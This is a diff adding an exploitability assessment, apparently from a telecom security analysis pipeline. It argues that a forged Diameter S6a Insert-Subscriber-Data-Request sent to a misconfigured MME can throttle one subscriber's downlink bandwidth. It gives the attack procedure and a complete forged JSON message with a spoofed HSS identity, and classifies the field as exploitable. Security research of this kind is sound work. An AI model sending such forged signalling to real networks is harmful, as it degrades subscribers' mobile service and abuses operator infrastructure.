@@ -1,0 +1,129 @@
+**Threat Model:**
+
+- **Attack Assumption:**
+  - The victim is an **MME** exposing **S6a** to the Internet due to misconfiguration.
+  - The attacker can impersonate the **HSS** role and establish an unauthenticated Diameter connection to the MME.
+  - The MME accepts a forged **Insert-Subscriber-Data-Request (IDR)** and processes the included `Subscription-Data` for a known subscriber.
+
+- **Attacker Capability:**
+  - The attacker can send crafted IDRs on its own Diameter connection to the target MME and receive the corresponding answers.
+  - The attacker cannot interfere with legitimate HSS<->MME signaling, cannot control eNodeB/SGW/PGW behavior directly, and has no bearer-plane position.
+  - The attacker relies on the MME treating the forged IDR as authoritative HSS-origin subscription data.
+
+**Exploitability Analysis:**
+
+`Subscription-Data.AMBR.Max-Requested-Bandwidth-DL` in an S6a IDR is field-specific exploitable under the stated threat model.
+
+This message is an **HSS->MME request**, and the target field is inside top-level `Subscription-Data.AMBR`, which TS 29.272 defines as the **subscriber UE-AMBR**, not APN-AMBR. The target AVP is the **downlink component** of that UE-AMBR. It is therefore subscriber provisioning state with **per-subscriber scope**, not descriptive metadata and not keyed by APN or bearer context.
+
+The protocol evidence states that IDR is used by the HSS to **replace or add specific user data stored in the MME**. Accordingly, if the forged IDR is accepted, the MME updates its stored subscription profile for that UE with the supplied UE-AMBR. The target field specifically changes the **downlink aggregate rate ceiling for non-GBR traffic**.
+
+That produces a distinct field-driven effect beyond generic forged-IDR abuse:
+
+1. The attacker sends an IDR containing `Subscription-Data.AMBR`.
+2. The MME stores the supplied UE-AMBR as authoritative subscription data.
+3. The modified `Max-Requested-Bandwidth-DL` changes the UE's subscribed **downlink UE-AMBR**.
+4. Per TS 23.401, the MME may propagate modified UE-AMBR to the eNodeB via **S1-AP UE Context Modification**.
+5. E-UTRAN enforces UE-AMBR in downlink for non-GBR traffic.
+
+So a maliciously low value directly causes **subscriber-specific QoS degradation / throttling**. This effect is attributable to the target field itself, not merely to sending IDR at all. The forged procedure is only the delivery mechanism; the harmful operational change comes from the semantics of this exact AVP.
+
+This is also not just transient parsing context. The value is stored in the MME's subscriber state and can affect:
+- active UE service if the MME updates the access-side context immediately; and/or
+- later bearer handling while the stale subscription remains present.
+
+Recovery is possible through later legitimate HSS-originated subscription refresh, re-attach/location update with fresh subscription download, UE context deletion, or MME restart depending on implementation. But until overwrite, the bad UE-AMBR can persist as stale served-subscriber state. That persistence is sufficient for a meaningful security impact.
+
+The field does **not** drive APN selection, PGW routing, or APN authorization, and those should not be claimed here. The supported impact is specifically **downlink non-GBR rate policy manipulation** at UE scope.
+
+**Attack Procedure:**
+
+Craft a minimal but coherent **Insert-Subscriber-Data-Request (IDR)** for S6a with:
+- command code **319**
+- application id **16777251**
+- mandatory Diameter routing/session AVPs
+- `User-Name` for the target subscriber
+- `Subscription-Data` containing only the relevant `AMBR` group
+
+Only mandatory and coherence-related fields are included; unrelated subscription structures are omitted.
+
+The malicious test value is:
+- `Subscription-Data.AMBR.Max-Requested-Bandwidth-DL = 64000`
+
+This sets the subscriber's **downlink UE-AMBR** to **64 kbit/s**, while keeping a valid nonzero UL companion value to satisfy AMBR structure requirements. If accepted, the expected success condition is that the MME updates subscriber QoS state and, for an active UE, propagates a reduced UE-AMBR toward E-UTRAN, resulting in severe downlink throttling for non-GBR traffic.
+
+**Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 319,
+    "application_id": 16777251,
+    "request": true,
+    "proxiable": true
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "attacker-hss.example.net;1234567890;1"
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "hss.attacker.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "attacker.example.net"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "mme01.epc.example.net"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "epc.example.net"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avp": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777251
+        }
+      ]
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "001010123456789"
+    },
+    {
+      "avp_name": "Subscription-Data",
+      "grouped_avp": [
+        {
+          "avp_name": "AMBR",
+          "grouped_avp": [
+            {
+              "avp_name": "Max-Requested-Bandwidth-UL",
+              "avp_value": 128000
+            },
+            {
+              "avp_name": "Max-Requested-Bandwidth-DL",
+              "avp_value": 64000
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
+```
+
+**Classification:**
+EXPLOITABLE
